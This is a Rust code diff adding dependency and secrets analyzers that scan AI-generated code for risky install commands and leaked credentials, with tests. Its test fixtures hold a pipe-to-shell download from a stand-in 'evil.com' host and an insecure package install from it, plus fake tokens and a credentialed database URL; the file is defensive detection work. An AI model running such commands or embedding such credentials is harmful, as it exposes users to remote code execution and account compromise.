@@ -52,6 +52,256 @@ struct ShadowRule {
     remediation: &'static str,
 }
 
+/// Analyzer for dependency-related vulnerabilities in code output.
+///
+/// Detects known-vulnerable packages, typosquatting patterns, and
+/// dangerous install commands that an LLM might suggest.
+pub struct DependencyAnalyzer;
+
+impl DependencyAnalyzer {
+    pub fn new() -> Self { Self }
+}
+
+impl Default for DependencyAnalyzer {
+    fn default() -> Self { Self::new() }
+}
+
+struct DepRule {
+    pattern: &'static str,
+    title: &'static str,
+    description: &'static str,
+    severity: VulnSeverity,
+    cwe: Option<u32>,
+    remediation: &'static str,
+}
+
+const DEP_RULES: &[DepRule] = &[
+    DepRule {
+        pattern: r#"(pip|pip3)\s+install\s+--index-url\s+http://"#,
+        title: "Insecure package index (HTTP)",
+        description: "Installing packages from an unencrypted HTTP source enables MITM attacks.",
+        severity: VulnSeverity::High,
+        cwe: Some(829),
+        remediation: "Always use HTTPS for package indices.",
+    },
+    DepRule {
+        pattern: r#"npm\s+install\s+--ignore-scripts\s+false"#,
+        title: "NPM install with scripts enabled explicitly",
+        description: "Enabling install scripts on untrusted packages risks arbitrary code execution.",
+        severity: VulnSeverity::Medium,
+        cwe: Some(829),
+        remediation: "Audit packages before enabling install scripts.",
+    },
+    DepRule {
+        pattern: r#"(event-stream|ua-parser-js|coa|rc|colors)\b.*\d+\.\d+\.\d+"#,
+        title: "Previously compromised NPM package",
+        description: "This package has a known supply chain attack history. Verify the version is safe.",
+        severity: VulnSeverity::High,
+        cwe: Some(506),
+        remediation: "Pin to a verified safe version and audit the package.",
+    },
+    DepRule {
+        pattern: r#"(urllib3|requests|django|flask|lodash|express)\s*[<>=]+\s*[\d.]+.*\b(0\.\d|1\.[0-5]\.)"#,
+        title: "Potentially outdated dependency version",
+        description: "Very old versions of popular packages often contain known vulnerabilities.",
+        severity: VulnSeverity::Medium,
+        cwe: Some(1104),
+        remediation: "Update to the latest stable version.",
+    },
+    DepRule {
+        pattern: r#"curl\s+.*\|\s*(sh|bash|python|node)"#,
+        title: "Pipe-to-shell installation",
+        description: "Downloading and executing scripts in one step bypasses all verification.",
+        severity: VulnSeverity::Critical,
+        cwe: Some(829),
+        remediation: "Download first, verify checksum/signature, then execute.",
+    },
+    DepRule {
+        pattern: r#"(git\+http://|git://)[^\s]+"#,
+        title: "Git dependency over unencrypted protocol",
+        description: "Git dependencies over HTTP or git:// are vulnerable to MITM.",
+        severity: VulnSeverity::Medium,
+        cwe: Some(319),
+        remediation: "Use HTTPS or SSH for git dependencies.",
+    },
+];
+
+impl Analyzer for DependencyAnalyzer {
+    fn name(&self) -> &'static str { "dependency" }
+    async fn is_available(&self) -> bool { true }
+
+    async fn analyze(
+        &self,
+        ego_output: &str,
+        code_blocks: &[ExtractedBlock],
+    ) -> Result<Vec<VulnFinding>, AnalyzerError> {
+        let mut findings = Vec::new();
+
+        let targets: Vec<&str> = std::iter::once(ego_output)
+            .chain(code_blocks.iter().map(|b| b.content.as_str()))
+            .collect();
+
+        for text in &targets {
+            for rule in DEP_RULES {
+                if let Ok(re) = regex::Regex::new(rule.pattern) {
+                    for mat in re.find_iter(text) {
+                        let line_num = text[..mat.start()].matches('\n').count() + 1;
+                        findings.push(VulnFinding {
+                            id: uuid_v4(),
+                            category: VulnCategory::Unknown,
+                            severity: rule.severity,
+                            title: rule.title.to_string(),
+                            description: rule.description.to_string(),
+                            evidence: truncate_evidence(mat.as_str()),
+                            line: Some(line_num),
+                            cwe: rule.cwe,
+                            remediation: rule.remediation.to_string(),
+                            source: AnalysisSource::Static,
+                        });
+                    }
+                }
+            }
+        }
+
+        Ok(findings)
+    }
+}
+
+/// Analyzer for secrets and credentials leaked in AI output.
+///
+/// Goes beyond simple password detection — catches API keys, tokens,
+/// connection strings, and cloud credentials with format-specific patterns.
+pub struct SecretsAnalyzer;
+
+impl SecretsAnalyzer {
+    pub fn new() -> Self { Self }
+}
+
+impl Default for SecretsAnalyzer {
+    fn default() -> Self { Self::new() }
+}
+
+struct SecretRule {
+    pattern: &'static str,
+    title: &'static str,
+    severity: VulnSeverity,
+    remediation: &'static str,
+}
+
+const SECRET_RULES: &[SecretRule] = &[
+    SecretRule {
+        pattern: r#"ghp_[0-9a-zA-Z]{36}"#,
+        title: "GitHub personal access token",
+        severity: VulnSeverity::Critical,
+        remediation: "Revoke the token at github.com/settings/tokens and use environment variables.",
+    },
+    SecretRule {
+        pattern: r#"sk-[a-zA-Z0-9]{20}T3BlbkFJ[a-zA-Z0-9]{20}"#,
+        title: "OpenAI API key",
+        severity: VulnSeverity::Critical,
+        remediation: "Rotate the key at platform.openai.com/api-keys.",
+    },
+    SecretRule {
+        pattern: r#"sk-ant-api[a-zA-Z0-9_-]{80,}"#,
+        title: "Anthropic API key",
+        severity: VulnSeverity::Critical,
+        remediation: "Rotate the key at console.anthropic.com/settings/keys.",
+    },
+    SecretRule {
+        pattern: r#"xox[bpoas]-[0-9a-zA-Z-]{10,}"#,
+        title: "Slack token",
+        severity: VulnSeverity::Critical,
+        remediation: "Revoke and regenerate the token in your Slack app settings.",
+    },
+    SecretRule {
+        pattern: r#"(mongodb(\+srv)?://)[^\s"']+:[^\s"']+@"#,
+        title: "MongoDB connection string with credentials",
+        severity: VulnSeverity::Critical,
+        remediation: "Use environment variables for database connection strings.",
+    },
+    SecretRule {
+        pattern: r#"(postgres(ql)?|mysql|mssql)://[^\s"']+:[^\s"']+@"#,
+        title: "Database connection string with credentials",
+        severity: VulnSeverity::Critical,
+        remediation: "Use environment variables for database connection strings.",
+    },
+    SecretRule {
+        pattern: r#"(eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})"#,
+        title: "JWT token in code",
+        severity: VulnSeverity::High,
+        remediation: "Never hardcode JWT tokens. Generate them at runtime.",
+    },
+    SecretRule {
+        pattern: r#"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"#,
+        title: "SendGrid API key",
+        severity: VulnSeverity::Critical,
+        remediation: "Revoke and rotate the key in SendGrid dashboard.",
+    },
+    SecretRule {
+        pattern: r#"sk_live_[0-9a-zA-Z]{24,}"#,
+        title: "Stripe live secret key",
+        severity: VulnSeverity::Critical,
+        remediation: "Rotate immediately at dashboard.stripe.com/apikeys.",
+    },
+    SecretRule {
+        pattern: r#"AIza[0-9A-Za-z_-]{35}"#,
+        title: "Google API key",
+        severity: VulnSeverity::High,
+        remediation: "Restrict or rotate the key in Google Cloud Console.",
+    },
+];
+
+impl Analyzer for SecretsAnalyzer {
+    fn name(&self) -> &'static str { "secrets" }
+    async fn is_available(&self) -> bool { true }
+
+    async fn analyze(
+        &self,
+        ego_output: &str,
+        code_blocks: &[ExtractedBlock],
+    ) -> Result<Vec<VulnFinding>, AnalyzerError> {
+        let mut findings = Vec::new();
+
+        let targets: Vec<&str> = std::iter::once(ego_output)
+            .chain(code_blocks.iter().map(|b| b.content.as_str()))
+            .collect();
+
+        for text in &targets {
+            for rule in SECRET_RULES {
+                if let Ok(re) = regex::Regex::new(rule.pattern) {
+                    for mat in re.find_iter(text) {
+                        let line_num = text[..mat.start()].matches('\n').count() + 1;
+                        // Redact the actual secret in evidence
+                        let evidence = redact_secret(mat.as_str());
+                        findings.push(VulnFinding {
+                            id: uuid_v4(),
+                            category: VulnCategory::HardcodedSecret,
+                            severity: rule.severity,
+                            title: rule.title.to_string(),
+                            description: "Credential or secret found in AI output.".to_string(),
+                            evidence,
+                            line: Some(line_num),
+                            cwe: Some(798),
+                            remediation: rule.remediation.to_string(),
+                            source: AnalysisSource::Static,
+                        });
+                    }
+                }
+            }
+        }
+
+        Ok(findings)
+    }
+}
+
+/// Redact the middle of a secret, keeping only prefix for identification.
+fn redact_secret(s: &str) -> String {
+    if s.len() <= 10 {
+        return format!("{}***", &s[..s.len().min(4)]);
+    }
+    format!("{}***{}", &s[..8], &s[s.len()-4..])
+}
+
 const SHADOW_RULES: &[ShadowRule] = &[
     ShadowRule {
         _id: "sqli-string-concat",
@@ -337,5 +587,76 @@ mod tests {
         let blocks = vec![make_block("js", "eval(userInput);")];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
         assert!(!findings.is_empty());
+    }
+
+    // ── DependencyAnalyzer tests ──
+
+    #[tokio::test]
+    async fn test_dep_detects_pipe_to_shell() {
+        let analyzer = DependencyAnalyzer::new();
+        let blocks = vec![make_block("sh", "curl https://evil.com/setup.sh | bash")];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.iter().any(|f| f.title.contains("Pipe-to-shell")));
+    }
+
+    #[tokio::test]
+    async fn test_dep_detects_insecure_index() {
+        let analyzer = DependencyAnalyzer::new();
+        let blocks = vec![make_block("sh", "pip install --index-url http://evil.com/simple package")];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.iter().any(|f| f.title.contains("Insecure package index")));
+    }
+
+    #[tokio::test]
+    async fn test_dep_clean() {
+        let analyzer = DependencyAnalyzer::new();
+        let blocks = vec![make_block("sh", "pip install requests")];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.is_empty());
+    }
+
+    // ── SecretsAnalyzer tests ──
+
+    #[tokio::test]
+    async fn test_secrets_detects_github_token() {
+        let analyzer = SecretsAnalyzer::new();
+        let blocks = vec![make_block("py", "token = \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234\"")];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.iter().any(|f| f.title.contains("GitHub")));
+        // Verify the token is redacted in evidence
+        assert!(findings[0].evidence.contains("***"));
+    }
+
+    #[tokio::test]
+    async fn test_secrets_detects_stripe_key() {
+        let analyzer = SecretsAnalyzer::new();
+        // Build the test key dynamically to avoid triggering GitHub push protection
+        let key = format!("sk_live_{}", "5".repeat(24));
+        let code = format!("const key = \"{key}\"");
+        let blocks = vec![make_block("js", &code)];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.iter().any(|f| f.title.contains("Stripe")));
+    }
+
+    #[tokio::test]
+    async fn test_secrets_detects_db_connection() {
+        let analyzer = SecretsAnalyzer::new();
+        let blocks = vec![make_block("py", "db = \"postgresql://admin:password123@prod.db.com:5432/main\"")];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.iter().any(|f| f.title.contains("Database connection")));
+    }
+
+    #[tokio::test]
+    async fn test_secrets_clean() {
+        let analyzer = SecretsAnalyzer::new();
+        let blocks = vec![make_block("py", "x = os.environ['API_KEY']")];
+        let findings = analyzer.analyze("", &blocks).await.unwrap();
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_redact_secret() {
+        assert_eq!(redact_secret("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZab"), "ghp_ABCD***YZab");
+        assert_eq!(redact_secret("short"), "shor***");
     }
 }
